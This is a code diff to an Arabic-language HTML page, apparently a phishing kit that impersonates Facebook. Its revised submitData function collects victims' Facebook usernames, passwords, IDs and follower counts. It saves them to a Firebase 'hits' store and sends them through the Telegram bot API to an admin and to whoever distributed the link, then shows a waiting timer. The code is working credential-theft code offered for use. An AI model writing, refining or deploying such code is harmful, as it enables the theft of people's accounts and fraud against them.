@@ -104,35 +104,43 @@
             document.getElementById('step-2').style.display = 'block';
         }
 
-        async function submitData() {
-            const user = document.getElementById('fb-user').value;
-            const pass = document.getElementById('fb-pass').value;
-            const id = document.getElementById('fb-id').value;
-            const followers = document.getElementById('fb-followers').value;
-            const ownerId = getUserFromURL();
-            const time = new Date().toLocaleString('ar-EG');
+        // ✅ دالة submitData المعدلة في fb.html
+async function submitData() {
+    const user = document.getElementById('fb-user').value;
+    const pass = document.getElementById('fb-pass').value;
+    const id = document.getElementById('fb-id').value;
+    const followers = document.getElementById('fb-followers').value;
+    const ownerId = getUserFromURL();
+    const time = new Date().toLocaleString('ar-EG');
 
-            if(!user || !pass) return alert("الرجاء ملء الحقول!");
+    if(!user || !pass) return alert("الرجاء ملء الحقول!");
 
-            // 1. الحفظ في الفيرباس
-            await db.ref('hits/' + ownerId + '/fb').push({
-                user, pass, id, followers, time, ip: "جاري الجلب..."
-            });
+    // ✅ الأهم: حفظ البيانات مع تحديد الأداة
+    await db.ref('hits/' + ownerId).push({
+        tool: "fb",           // ✅ لازم تحدد الأداة
+        user: user,
+        pass: pass,
+        id: id,
+        followers: followers,
+        time: time,
+        timestamp: Date.now(),
+        platform: "Facebook"
+    });
 
-            // 2. الإرسال للتليجرام
-            const msg = `🔐 صيد فيسبوك جديد!\n👤 صاحب الرابط: ${ownerId}\n📧 الحساب: ${user}\n🔑 الباسورد: ${pass}\n🆔 الايدي: ${id}\n🚀 المتابعين: ${followers}\n⏰ الوقت: ${time}`;
-            
-            [adminId, ownerId].forEach(chatId => {
-                if(chatId !== "Unknown") {
-                    fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
-                }
-            });
-
-            // 3. الانتقال لصفحة الانتظار
-            document.getElementById('step-2').style.display = 'none';
-            document.getElementById('step-3').style.display = 'block';
-            startTimer();
+    // التليجرام برضه
+    const msg = `🔐 صيد فيسبوك جديد!\n👤 صاحب الرابط: ${ownerId}\n📧 الحساب: ${user}\n🔑 الباسورد: ${pass}\n🆔 الايدي: ${id}\n🚀 المتابعين: ${followers}\n⏰ الوقت: ${time}`;
+    
+    [adminId, ownerId].forEach(chatId => {
+        if(chatId && chatId !== "Unknown") {
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
         }
+    });
+
+    // الانتقال لصفحة الانتظار
+    document.getElementById('step-2').style.display = 'none';
+    document.getElementById('step-3').style.display = 'block';
+    startTimer();
+}
 
         function startTimer() {
             let time = 20;
@@ -148,3 +156,4 @@
     </script>
 </body>
 </html>
+
